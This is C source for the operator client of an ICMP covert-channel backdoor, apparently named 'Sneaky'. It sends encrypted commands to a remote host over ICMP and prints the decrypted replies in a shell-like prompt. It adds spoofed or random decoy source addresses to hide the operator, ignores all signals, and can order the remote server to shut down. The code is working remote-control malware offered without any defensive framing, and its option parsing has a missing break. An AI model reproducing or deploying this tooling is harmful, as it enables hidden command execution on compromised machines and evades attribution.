#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <unistd.h>
#include "libicmp-client.h"
#include "sneak.h"

char *spbuf[BUFSIZ];  /* decoy and client spoofing lists */
int spcount = 0;
int delay = 0;
char *curdec = NULL;
char *realip;

int
main (int argc, char *argv[])
{

  int opt;
  char *optstr = "i:l:t:s:S:d:D:";

  int sigcount = 0;
  int timeout = 5;
  int decoyopt = 0;
  unsigned long ip = 0;
  char buf[BUFSIZ];
  char *oldip;
  char *ebuf;
  char rbuf[BUFSIZ * 4];
  char *ukey = NULL;
  char *logfile = NULL;
  struct utsname moo;
  FILE *fp = NULL;
  extern char *realip;
  extern char *spbuf[BUFSIZ];  
  extern char *curdec;
  extern int spcount;
  extern int delay;
  char *lip = NULL;
  struct hostent *hosts;
  struct in_addr addrip;
  struct timeval tv;
  fd_set read;

  if (argc < 2)
    use (argv[0]);

  bzero (rbuf, BUFSIZ * 4);
  bzero (buf, BUFSIZ);

  while ((opt = getopt (argc, argv, optstr)) != EOF)
    {

      switch (opt)
	{


	case 'i':
	  {
	    ip = inet_addr (optarg);
	    break;
	  }

	case 'l':
	  {
	    logfile = optarg;
	    break;
	  }

	case 't':
	  {
	    timeout = atoi (optarg);
	    break;
	  }

	case 's':
	  {
	    lip = optarg;
	    break;
          }

	case 'S':
	  {

		spbuf[spcount] = strtok(optarg,",");
		spcount++;

		while((spbuf[spcount] = strtok(NULL,",")) != NULL)
		spcount++;
		spcount--;

         } 
	
	case 'd': 
          {
	    decoyopt = atoi(optarg);
            break; 
          }
	case 'D': 
          {
	    delay = atoi(optarg);
            break; 
          }
	}
       } 


  if (ip == 0)
    {

      printf ("No ip or invalid ip check -i\n");
      exit (0);
    }


  ukey = key ();

  for (sigcount = 0; sigcount < SIGMAX; ++sigcount)	/* Sigs suck */
    signal (sigcount, SIG_IGN);

  if (logfile != NULL)
    {

      if ((fp = fopen (logfile, "w")) == NULL)
	{
	  perror ("fopen()");
	  exit (1);

	}
    }

  uname (&moo);
  printf ("\033[1;34m[Sneaky@%s]#\033[0m ", moo.nodename);

   if(lip != NULL)
     realip = lip;

 else if ((hosts = gethostbyname (moo.nodename)) != NULL)
    {
      bcopy (hosts->h_addr, (char *) &addrip.s_addr, hosts->h_length);
      realip = inet_ntoa (addrip);
    }


  else
    {
      fprintf (stderr, "Cant determine local ip, use -s\n");
      exit (0);
    }

  ICMP_init ();

  FD_ZERO (&read);
  FD_SET (rsockfd, &read);


  /* main loop */

  while ((!ferror (stdin)) && (!feof (stdin)))
    {

      fgets (buf, BUFSIZ, stdin);
      buf[strlen (buf) - 1] = 0;

      if (logfile != NULL)
	fprintf (fp, "INPUT:%s\n\n", buf);

/* Shutdown client */

      if ((strncmp (buf, EXIT, strlen (EXIT))) == 0)
	break;

/* Shutdown client and server */

      if ((strncmp (buf, CLOSE, strlen (CLOSE))) == 0)
	{
	  ICMP_sp_send (crypt ((spkt (buf)), ukey, ENCRYPT), 0, ip, 0, 0);

	  if(decoyopt) 
           {
            oldip = realip;
	    sigcount = getrandom(0,decoyopt);

	    for(opt = 0;opt < sigcount;opt++)
             {
	       if(spcount)
	        realip = spbuf[getrandom(0,spcount)];
	       else
		realip = randip();

		curdec = realip;

	       decoy(ip,crypt((spkt(buf)),ukey,ENCRYPT));
	       curdec = NULL;
             }
	    realip = oldip;
           }
	  
	  break;
	}

/* Clear */

      else if ((strncmp (buf, CLEAR, strlen (CLEAR))) == 0)
	system ("clear");

      else
	{

	  if ((ICMP_sp_send
	       (crypt ((spkt (buf)), ukey, ENCRYPT), 0, ip, 0, 0)) == -1)
	    {
	      perror ("icmp_send()");
	      break;
	    }
	  if(decoyopt) 
           {
            oldip = realip;
	    sigcount = getrandom(0,decoyopt);

	    for(opt = 0;opt < sigcount;opt++)
             {
	       if(spcount)
	        realip = spbuf[getrandom(0,spcount)];
	       else
		realip = randip();

		curdec = realip;
	       decoy(ip,crypt((spkt(buf)),ukey,ENCRYPT));
		curdec = NULL;
             }
	    realip = oldip;
           }

	  tv.tv_sec = timeout;
	  tv.tv_usec = 0;

	  if (select(rsockfd + 1, &read, NULL, NULL, &tv))
	    {

	      if ((ICMP_recv (rbuf, MAXMESG, 1)) != -666)
		{
		  printf ("%s", crypt (rbuf, ukey, DECRYPT));

		  if (logfile != NULL)
		    fprintf (fp, "OUTPUT:\n%s\n",
			     crypt (rbuf, ukey, DECRYPT));
		}

	      else
		perror ("recv()");
	    }
	else
	  printf ("Timedout, try resending\n");
	}

      printf ("\033[1;34m[Sneaky@%s]#\033[0m ", moo.nodename);

      bzero (rbuf, BUFSIZ * 4);
      bzero (buf, BUFSIZ);
      ebuf = NULL;

    }

  /* deinitialization */

  if (logfile != NULL)
    fclose (fp);

  ICMP_reset ();
  return 0;

}
